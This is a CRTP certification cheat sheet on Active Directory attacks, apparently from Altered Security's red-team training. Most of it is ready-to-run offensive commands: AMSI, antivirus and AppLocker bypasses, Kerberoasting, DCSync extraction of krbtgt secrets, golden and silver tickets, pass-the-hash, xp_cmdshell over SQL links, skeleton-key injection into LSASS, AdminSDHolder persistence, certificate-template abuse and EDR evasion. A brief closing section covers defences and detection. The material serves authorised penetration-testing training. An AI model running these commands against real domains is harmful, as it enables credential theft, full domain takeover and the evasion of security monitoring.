# CRTP

### **Comprehensive Attacking & Defending Active Directory Cheat Sheet**  
**By Nikhil Mittal | Altered Security**  

---

### **1. PowerShell Tradecraft**  
#### **Bypass Execution Policy**  
```powershell
powershell -ExecutionPolicy bypass  
powershell -c <command>  
powershell -EncodedCommand <base64>  
$env:PSExecutionPolicyPreference = "bypass"  
```

#### **AMSI Bypass**  
- **Invisi-Shell**:  
  ```bash
  RunWithPathAsAdmin.bat      # Admin privileges  
  RunWithRegistryNonAdmin.bat # Non-admin  
  ```

#### **AV Bypass**  
- **Detect Flagged Code**:  
  ```bash
  AMSITrigger_x64.exe -i C:\AD\Tools\script.ps1  
  DefenderCheck.exe script.ps1  
  ```
- **Modify & Obfuscate**: Reverse strings, remove detected code blocks, use **Invoke-Obfuscation**.  
- **Invoke-Mimikatz**: Rename functions, variables, and obfuscate PEBytes.  

---

### **2. Domain Enumeration**  
#### **Key Tools**  
- **PowerView**: `Get-DomainUser`, `Get-DomainComputer`, `Get-DomainGPO`.  
- **BloodHound**:  
  ```bash
  SharpHound.exe --collectionmethods All --excludedcs  
  # Stealthy:  
  SharpHound.exe --collectionmethods Group,Session,ACL --excludedcs  
  ```
- **ActiveDirectory Module**: `Get-ADUser`, `Get-ADComputer`, `Get-ADGroup`.

#### **Critical Commands**  
- **Users/Computers**:  
  ```powershell
  Get-DomainUser -SPN                  # Kerberoastable users  
  Get-DomainComputer -OperatingSystem "*Server 2022*"  
  ```
- **ACLs**:  
  ```powershell
  Get-DomainObjectACL -Identity "Domain Admins" -ResolveGUIDs  
  Find-InterestingDomainACL            # Find sensitive permissions  
  ```
- **GPOs**:  
  ```powershell
  Get-DomainGPO -ComputerIdentity dcorp-ci  
  Get-DomainGPOLocalGroup              # Find GPOs adding users to local groups  
  ```
- **Trusts**:  
  ```powershell
  Get-DomainTrust  
  Get-ForestGlobalCatalog              # Enumerate forest trusts  
  ```

---

### **3. Privilege Escalation**  
#### **Local Escalation**  
- **PowerUp**:  
  ```powershell
  Invoke-AllChecks  
  Get-ServiceUnquoted                  # Unquoted service paths  
  Get-ModifiableService                # Writable services  
  ```
- **PrivescCheck**:  
  ```powershell
  Invoke-PrivescCheck                  # Automated checks  
  ```

#### **Domain Escalation**  
- **Kerberoasting**:  
  ```bash
  Rubeus.exe kerberoast /user:svc_sql /rc4opsec  
  john --wordlist=rockyou.txt hashes.txt  
  ```
- **AS-REP Roasting**:  
  ```bash
  Rubeus.exe asreproast /user:vpn_user /outfile:asrep.txt  
  ```
- **DCSync**:  
  ```bash
  SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt"  
  ```
- **Golden Ticket**:  
  ```bash
  Rubeus.exe golden /aes256:<krbtgt_aes> /domain:dcorp.local /user:Administrator /ptt  
  ```
- **Silver Ticket**:  
  ```bash
  Rubeus.exe silver /service:cifs/dc.dcorp.local /rc4:<service_hash> /user:Administrator /ptt  
  ```

---

### **4. Lateral Movement**  
#### **PowerShell Remoting**  
```powershell
Enter-PSSession -ComputerName dcorp-ci  
Invoke-Command -ScriptBlock {whoami} -ComputerName dcorp-mssql  
```

#### **OverPass-the-Hash (OPTH)**  
```bash
Rubeus.exe asktgt /user:admin /rc4:<ntlm_hash> /ptt  
```

#### **Mimikatz**  
```bash
SafetyKatz.exe "sekurlsa::pth /user:admin /domain:dcorp /ntlm:<hash> /run:cmd.exe"  
```

#### **MSSQL Database Links**  
```sql
-- Enumerate links:  
SELECT * FROM OPENQUERY("dcorp-sql1", 'SELECT * FROM master..sysservers')  
-- Execute commands:  
EXEC('xp_cmdshell ''whoami''') AT "dcorp-sql1"  
```

---

### **5. Persistence**  
#### **Golden Ticket**  
```bash
Rubeus.exe golden /aes256:<krbtgt_aes> /domain:dcorp /user:Administrator /ptt  
```

#### **AdminSDHolder Abuse**  
```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dcorp,DC=local" -PrincipalIdentity attacker -Rights All  
```

#### **Skeleton Key**  
```bash
SafetyKatz.exe "misc::skeleton"   # Injects password "mimikatz" into LSASS  
```

#### **DSRM Password**  
```bash
SafetyKatz.exe "lsadump::sam"     # Extract DSRM hash  
reg add HKLM\System\CurrentControlSet\Control\Lsa /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2  
```

---

### **6. Cross-Trust Attacks**  
#### **Child → Parent Trust Abuse**  
```bash
Rubeus.exe silver /service:krbtgt/child.domain /rc4:<trust_key> /sids:S-1-5-21-...-519 /user:Administrator  
```

#### **AD CS Exploitation (ESC1/ESC3)**  
- **ESC1 (Enrollee Supplies Subject)**:  
  ```bash
  Certify.exe request /ca:dc.domain\ca /template:VulnTemplate /altname:DOMAIN\Administrator  
  Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:Pass@123  
  ```
- **ESC3 (Certificate Request Agent)**:  
  ```bash
  Certify.exe request /ca:dc.domain\ca /template:EnrollmentAgent  
  Certify.exe request /ca:dc.domain\ca /template:UserTemplate /onbehalfof:DOMAIN\Administrator /enrollcert:agent.pfx  
  ```

---

### **7. Bypassing Defenses**  
#### **MDE/EDR Evasion**  
- **LSASS Dumping**: Use **MiniDumpDotNet** (custom API implementation).  
- **OPSEC-Friendly Commands**:  
  ```powershell
  # Use SET instead of whoami:  
  cmd /c "SET USERNAME"  
  ```

#### **AppLocker Bypass**  
- **Trusted Binaries**:  
  ```bash
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe malicious.xml  
  C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:malicious.exe malicious.cs  
  ```

---

### **8. Detection & Defense**  
#### **Protect Credentials**  
- **Protected Users Group**: Restrict credential caching and Kerberos encryption.  
- **LAPS**: Centralized local admin password management.  
- **Credential Guard**: Virtualize LSASS to block credential theft.  

#### **Deception**  
- **Deploy-Deception**: Create decoy users/objects to trigger alerts.  
  ```powershell
  Create-DecoyUser -UserFirstName decoy -UserLastName admin | Deploy-UserDeception  
  ```

#### **Monitoring**  
- **Kerberoasting**: Alert on Event ID 4769 with Ticket Encryption Type `0x17`.  
- **Golden Ticket**: Monitor TGT requests with abnormal lifetimes.  

---

### **References & Tools**  
- **Tools**:  
  - [PowerView](https://github.com/PowerShellMafia/PowerSploit)  
  - [BloodHound](https://github.com/BloodHoundAD/BloodHound)  
  - [Rubeus](https://github.com/GhostPack/Rubeus)  
  - [Certify](https://github.com/GhostPack/Certify)  
- **Labs**: [AlteredSecurity AD Lab](https://adlab.enterprisesecurity.io)  
- **Contact**: [@nikhil_mitt](https://twitter.com/nikhil_mitt) | [Altered Security](https://alteredsecurity.com)  

---

**Disclaimer**: Use only in authorized environments. Unauthorized penetration testing is illegal.
